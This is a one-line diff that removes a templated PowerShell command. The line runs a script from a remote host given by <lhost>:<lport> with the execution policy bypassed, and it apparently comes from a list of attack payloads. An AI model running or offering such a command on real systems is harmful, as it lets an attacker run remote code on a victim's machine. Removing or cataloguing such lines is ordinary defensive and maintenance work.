@@ -1,1 +1,0 @@
-powershell -exec bypass -f \\<lhost>:<lport>/<path=script.ps1>
